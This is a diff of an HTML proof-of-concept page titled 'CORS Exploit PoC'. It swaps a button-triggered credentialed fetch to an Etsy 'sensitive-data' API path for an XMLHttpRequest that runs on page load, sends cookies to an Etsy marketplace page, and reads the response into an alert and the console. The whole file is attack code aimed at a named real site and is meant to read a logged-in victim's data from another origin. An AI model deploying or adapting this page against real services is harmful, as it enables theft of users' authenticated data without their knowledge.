@@ -1,30 +1,17 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit PoC</title>
-</head>
+<html>
 <body>
-    <h1>CORS Exploit PoC</h1>
-    <button onclick="exploit()">Click to exploit</button>
-
-    <script>
-        function exploit() {
-            fetch('https://etsy.com/api/sensitive-data', {
-                method: 'GET',
-                credentials: 'include'  // Include cookies for authenticated requests
-            })
-            .then(response => response.text())
-            .then(data => {
-                // Log sensitive data from the victim's request
-                console.log("Exploited data: ", data);
-                alert("Exploited data: " + data);
-            })
-            .catch(error => {
-                console.error("Error:", error);
-            });
+  <h1>Exploit</h1>
+  <script>
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://www.etsy.com/in-en/market/gift_for_women', true);
+    xhr.withCredentials = true; // Send cookies
+    xhr.onload = function () {
+        if (xhr.status === 200) {
+            console.log('Response:', xhr.responseText); // Sensitive data could be printed here
+            alert('Exploit Successful: ' + xhr.responseText);
         }
-    </script>
+    };
+    xhr.send();
+  </script>
 </body>
 </html>
